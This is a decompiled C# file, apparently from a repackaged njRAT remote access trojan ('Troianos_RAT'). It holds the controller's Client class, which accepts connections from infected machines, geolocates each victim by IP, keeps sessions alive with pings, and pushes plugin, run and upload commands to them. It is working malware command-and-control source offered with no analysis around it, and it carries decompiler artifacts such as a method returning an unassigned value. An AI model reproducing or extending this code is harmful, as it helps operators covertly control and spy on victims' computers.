using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.njRAT;

namespace Troianos_RAT.NJRAT
{
	// Token: 0x02000026 RID: 38
	public class Client
	{
		// Token: 0x06000422 RID: 1058 RVA: 0x001D3564 File Offset: 0x001D1964
		public Client(TcpClient c, SK sk)
		{
			this.bool_0 = false;
			this.CN = true;
			this.CName = "Unknown";
			this.Co = "--";
			this.int_0 = 5;
			this.Isend = false;
			this.isPL = false;
			this.IsPNGED = false;
			this.lastAC = string.Empty;
			this.lastPC = default(DateTime);
			this.lastPing = DateTime.Now;
			this.msec = 0L;
			this.NoPing = false;
			this.plg = new List<string>();
			this.string_0 = string.Empty;
			this.t = new System.Threading.Timer(new TimerCallback(this.lam__6), null, 0, 3000);
			this.M = new MemoryStream();
			this.b = new byte[1];
			this.string_1 = string.Empty;
			this.Length = -1L;
			this.osk = null;
			this.bool_1 = false;
			this.Client = c;
			this.SK = sk;
			try
			{
				GClass4 gclass = Class7.gclass3_0.method_4(c.Client.RemoteEndPoint.ToString().Split(new char[]
				{
					':'
				})[0]);
				this.Co = gclass.method_0();
				this.CName = gclass.method_1();
				bool flag = Operators.CompareString(this.Co, "A1", false) == 0 | Operators.CompareString(this.Co, "A2", false) == 0;
				if (flag)
				{
					this.Co = "--";
				}
				flag = !Class7.form1_0.IMG2.Images.ContainsKey(this.Co + ".png");
				if (flag)
				{
					this.Co = "--";
				}
				this.COI = (Bitmap)Class7.form1_0.IMG2.Images[this.Co + ".png"];
			}
			catch (Exception ex)
			{
			}
			this.Client.Client.BeginReceive(this.b, 0, this.b.Length, SocketFlags.None, new AsyncCallback(this.b_read), null);
		}

		// Token: 0x06000423 RID: 1059 RVA: 0x001D37B4 File Offset: 0x001D1BB4
		[DebuggerStepThrough]
		[CompilerGenerated]
		private void lam__5(object object_0)
		{
			this.SEND_((byte[])object_0);
		}

		// Token: 0x06000424 RID: 1060 RVA: 0x001D37C8 File Offset: 0x001D1BC8
		[CompilerGenerated]
		[DebuggerStepThrough]
		private void lam__6(object object_0)
		{
			this.method_0();
		}

		// Token: 0x06000425 RID: 1061 RVA: 0x001D37D4 File Offset: 0x001D1BD4
		public void b_read(IAsyncResult ar)
		{
			bool flag = !this.CN | this.bool_1;
			if (!flag)
			{
				bool flag2;
				try
				{
					int num = 0;
					try
					{
						num = this.Client.Client.EndReceive(ar);
					}
					catch (SocketException ex)
					{
						SocketException ex2 = ex;
						this.string_1 = ex2.SocketErrorCode.ToString();
						goto IL_422;
					}
					flag = (num <= 0);
					if (flag)
					{
						goto IL_422;
					}
					Class7.long_1 += (long)num;
					flag = (this.Length == -1L);
					if (flag)
					{
						flag2 = (this.b[0] == 0);
						if (flag2)
						{
							byte[] array = this.M.ToArray();
							this.Length = Conversions.ToLong(Class6.smethod_12(ref array));
							this.M.Dispose();
							this.M = new MemoryStream();
							flag2 = (this.Length == 0L);
							if (flag2)
							{
								this.Length = -1L;
								flag2 = (this.L == null & !this.isPL);
								if (flag2)
								{
									this.string_1 = "LTimeOut";
									goto IL_422;
								}
								int num2 = (int)Math.Round(Math.Round((DateAndTime.Now.Subtract(this.lastPing).TotalMilliseconds - 10.0) / 1.5));
								flag2 = (num2 < 0);
								if (flag2)
								{
									num2 = 0;
								}
								flag2 = (num2 > 999);
								if (flag2)
								{
									num2 = 999;
								}
								this.lastPing = DateAndTime.Now;
								this.IsPNGED = false;
								string text = "P" + Class7.string_1 + num2.ToString("000");
								GClass12 gclass = new GClass12(this, Class6.smethod_11(ref text));
								List<GClass12> req = this.SK.REQ;
								List<GClass12> obj = req;
								lock (obj)
								{
									this.SK.REQ.Add(gclass);
								}
								while (!gclass.bool_0)
								{
									Thread.Sleep(1);
								}
								goto IL_39E;
							}
							else
							{
								this.b = new byte[(int)(this.Length - 1L) + 1 - 1 + 1];
							}
						}
						else
						{
							this.M.WriteByte(this.b[0]);
						}
					}
					else
					{
						this.M.Write(this.b, 0, num);
						flag2 = (this.M.Length == this.Length);
						if (flag2)
						{
							this.Length = -1L;
							GClass12 gclass2 = new GClass12(this, this.M.ToArray());
							List<GClass12> req2 = this.SK.REQ;
							List<GClass12> obj2 = req2;
							lock (obj2)
							{
								this.SK.REQ.Add(gclass2);
							}
							while (!gclass2.bool_0)
							{
								Thread.Sleep(1);
							}
							this.M.Dispose();
							this.M = new MemoryStream();
							this.b = new byte[1];
						}
						else
						{
							this.b = new byte[(int)(this.Length - this.M.Length - 1L) + 1 - 1 + 1];
						}
					}
					Thread.Sleep(1);
				}
				catch (Exception ex3)
				{
					this.string_1 = "RError";
					goto IL_422;
				}
				IL_39E:
				flag2 = !this.CN;
				if (flag2)
				{
					return;
				}
				try
				{
					this.Client.Client.BeginReceive(this.b, 0, this.b.Length, SocketFlags.None, new AsyncCallback(this.b_read), null);
					return;
				}
				catch (SocketException ex4)
				{
					SocketException ex5 = ex4;
					this.string_1 = ex5.SocketErrorCode.ToString();
				}
			}
			IL_422:
			this.CN = false;
		}

		// Token: 0x06000426 RID: 1062 RVA: 0x001D3C88 File Offset: 0x001D2088
		public void Close()
		{
			bool flag = !this.bool_1;
			if (flag)
			{
				this.bool_1 = true;
				this.CN = false;
				try
				{
					this.t.Dispose();
				}
				catch (Exception ex)
				{
				}
				try
				{
					this.M.Dispose();
				}
				catch (Exception ex2)
				{
				}
				try
				{
					flag = this.Client.Connected;
					if (flag)
					{
						this.Client.GetStream().Close();
					}
				}
				catch (Exception ex3)
				{
				}
				try
				{
					this.Client.Client.Close();
				}
				catch (Exception ex4)
				{
				}
				this.Isend = false;
				this.plg.Clear();
				flag = (Operators.CompareString(this.string_1, string.Empty, false) == 0);
				if (flag)
				{
					this.string_1 = "Disconnected";
				}
				flag = (this.L != null & !this.isPL);
				bool flag2;
				if (flag)
				{
					flag2 = Class7.class8_0.bool_1;
					if (flag2)
					{
						Class7.form1_0.Pp1.WRT(new object[]
						{
							Color.LightSteelBlue,
							Class6.smethod_13(),
							Color.DarkSlateBlue,
							this.COI,
							this.ip(),
							Color.IndianRed,
							RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.L)))),
							Color.DarkRed,
							this.string_1
						});
					}
				}
				else
				{
					flag2 = Class7.class8_0.bool_2;
					if (flag2)
					{
						Class7.form1_0.Pp1.WRT(new object[]
						{
							Color.LightSteelBlue,
							Class6.smethod_13(),
							this.COI,
							Color.Red,
							this.ip(),
							Color.IndianRed,
							this.string_1
						});
					}
				}
				Collection online = Class7.sk_0.Online;
				Collection obj = online;
				lock (obj)
				{
					flag2 = Class7.sk_0.Online.Contains(this.ip());
					if (flag2)
					{
						Class7.sk_0.Online.Remove(this.ip());
					}
				}
				flag2 = (this.L != null);
				if (flag2)
				{
					Class7.form1_0.L1.method_9(this.L);
				}
				this.L = null;
			}
		}

		// Token: 0x06000427 RID: 1063 RVA: 0x001D3FF4 File Offset: 0x001D23F4
		public string ip()
		{
			bool flag = this.string_0.Length <= 0;
			if (flag)
			{
				try
				{
					this.string_0 = this.Client.Client.RemoteEndPoint.ToString();
				}
				catch (Exception ex)
				{
					this.string_0 = this.GetHashCode().ToString();
				}
			}
			return this.string_0;
		}

		// Token: 0x06000428 RID: 1064 RVA: 0x001D4088 File Offset: 0x001D2488
		private void method_0()
		{
			bool flag = !(this.bool_0 | this.bool_1);
			if (flag)
			{
				lock (this)
				{
					this.bool_0 = true;
					flag = !this.CN;
					if (flag)
					{
						this.Close();
					}
					else
					{
						double totalSeconds = DateAndTime.Now.Subtract(this.lastPing).TotalSeconds;
						flag = (!this.isPL && (this.L == null & totalSeconds > 8.0));
						if (flag)
						{
							this.string_1 = "LTimeOut";
							this.Close();
						}
						else
						{
							flag = !this.NoPing;
							if (flag)
							{
								bool flag2 = !this.IsPNGED;
								if (flag2)
								{
									bool flag3 = totalSeconds >= (double)this.int_0;
									if (flag3)
									{
										this.int_0 = 15;
										string empty = string.Empty;
										this.SEND_(Class6.smethod_11(ref empty));
										this.IsPNGED = true;
										this.lastPing = DateAndTime.Now;
										flag3 = !this.CN;
										if (flag3)
										{
											this.Close();
											goto IL_230;
										}
									}
								}
								else
								{
									bool flag3 = this.SendingProgress == 0 & !this.isPL & totalSeconds > 6.0 & this.L != null;
									if (flag3)
									{
										try
										{
											flag2 = (this.L.Cells.Count > Class7.int_10);
											if (flag2)
											{
												this.L.Cells[Class7.int_10].Value = "TimeOut";
												this.L.Cells[Class7.int_10].Style.ForeColor = Color.Red;
												this.SEND_(new byte[1025]);
												flag3 = !this.CN;
												if (flag3)
												{
													this.Close();
													goto IL_230;
												}
											}
										}
										catch (Exception ex)
										{
											this.Close();
											goto IL_230;
										}
									}
								}
							}
							this.bool_0 = false;
							IL_230:;
						}
					}
				}
			}
		}

		// Token: 0x06000429 RID: 1065 RVA: 0x001D430C File Offset: 0x001D270C
		public int rp()
		{
			bool flag = this.Length == -1L;
			int result;
			if (flag)
			{
				result = 0;
			}
			else
			{
				int num;
				try
				{
					num = Class6.smethod_1((int)this.M.Length, (int)this.Length);
				}
				catch (Exception ex)
				{
					num = 0;
				}
				result = num;
			}
			return result;
		}

		// Token: 0x0600042A RID: 1066 RVA: 0x001D4384 File Offset: 0x001D2784
		public bool Send(string S)
		{
			this.Send(Class6.smethod_11(ref S));
			bool result;
			return result;
		}

		// Token: 0x0600042B RID: 1067 RVA: 0x001D43A8 File Offset: 0x001D27A8
		public void Send(byte[] b)
		{
			bool cn = this.CN;
			if (cn)
			{
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.lam__5), b);
			}
		}

		// Token: 0x0600042C RID: 1068 RVA: 0x001D43D8 File Offset: 0x001D27D8
		public void SEND_(byte[] b)
		{
			try
			{
				lock (this)
				{
					this.SendingProgress = 0;
					string[] array = null;
					bool flag = b.Length > 3;
					if (flag)
					{
						array = new string[]
						{
							Conversions.ToString(Strings.ChrW((int)b[0])) + Conversions.ToString(Strings.ChrW((int)b[1])) + Conversions.ToString(Strings.ChrW((int)b[2]))
						};
						flag = !(Operators.CompareString(array[0], "inv", false) == 0 | Operators.CompareString(array[0], "rn" + Conversions.ToString(Strings.ChrW((int)b[2])), false) == 0 | Operators.CompareString(array[0], "up" + Conversions.ToString(Strings.ChrW((int)b[2])), false) == 0 | Operators.CompareString(array[0], "ret", false) == 0 | Operators.CompareString(array[0], "PLG", false) == 0);
						if (flag)
						{
							array = null;
						}
					}
					int num = 0;
					MemoryStream memoryStream = new MemoryStream();
					string text = b.Length.ToString() + "\0";
					byte[] array2 = Class6.smethod_11(ref text);
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(b, 0, b.Length);
					int i = 1;
					long length = memoryStream.Length;
					memoryStream.Position = 0L;
					while (i >= 1)
					{
						byte[] array3 = new byte[10241];
						i = memoryStream.Read(array3, 0, array3.Length);
						this.Client.Client.Poll(-1, SelectMode.SelectWrite);
						try
						{
							this.Client.Client.Send(array3, 0, i, SocketFlags.None);
						}
						catch (SocketException ex)
						{
							SocketException ex2 = ex;
							this.SendingProgress = 0;
							this.string_1 = ex2.SocketErrorCode.ToString();
							this.CN = false;
							return;
						}
						Class7.long_0 += (long)i;
						num += i;
						flag = (!this.CN | this.bool_1);
						if (flag)
						{
							return;
						}
						flag = (array != null);
						if (flag)
						{
							this.SendingProgress = Class6.smethod_1(num, (int)length);
						}
					}
					memoryStream.Dispose();
					this.SendingProgress = 0;
				}
			}
			catch (Exception ex3)
			{
				this.SendingProgress = 0;
				this.string_1 = "SError";
				this.CN = false;
			}
		}

		// Token: 0x04000215 RID: 533
		public byte[] b;

		// Token: 0x04000216 RID: 534
		private bool bool_0;

		// Token: 0x04000217 RID: 535
		private bool bool_1;

		// Token: 0x04000218 RID: 536
		public TcpClient Client;

		// Token: 0x04000219 RID: 537
		public bool CN;

		// Token: 0x0400021A RID: 538
		public string CName;

		// Token: 0x0400021B RID: 539
		public string Co;

		// Token: 0x0400021C RID: 540
		public Bitmap COI;

		// Token: 0x0400021D RID: 541
		public string Folder;

		// Token: 0x0400021E RID: 542
		private int int_0;

		// Token: 0x0400021F RID: 543
		public bool Isend;

		// Token: 0x04000220 RID: 544
		public bool isPL;

		// Token: 0x04000221 RID: 545
		public bool IsPNGED;

		// Token: 0x04000222 RID: 546
		public DataGridViewRow L;

		// Token: 0x04000223 RID: 547
		public string lastAC;

		// Token: 0x04000224 RID: 548
		public DateTime lastPC;

		// Token: 0x04000225 RID: 549
		public DateTime lastPing;

		// Token: 0x04000226 RID: 550
		public long Length;

		// Token: 0x04000227 RID: 551
		public MemoryStream M;

		// Token: 0x04000228 RID: 552
		public long msec;

		// Token: 0x04000229 RID: 553
		public bool NoPing;

		// Token: 0x0400022A RID: 554
		public Client osk;

		// Token: 0x0400022B RID: 555
		public List<string> plg;

		// Token: 0x0400022C RID: 556
		public int SendingProgress;

		// Token: 0x0400022D RID: 557
		public SK SK;

		// Token: 0x0400022E RID: 558
		private string string_0;

		// Token: 0x0400022F RID: 559
		private string string_1;

		// Token: 0x04000230 RID: 560
		public System.Threading.Timer t;
	}
}
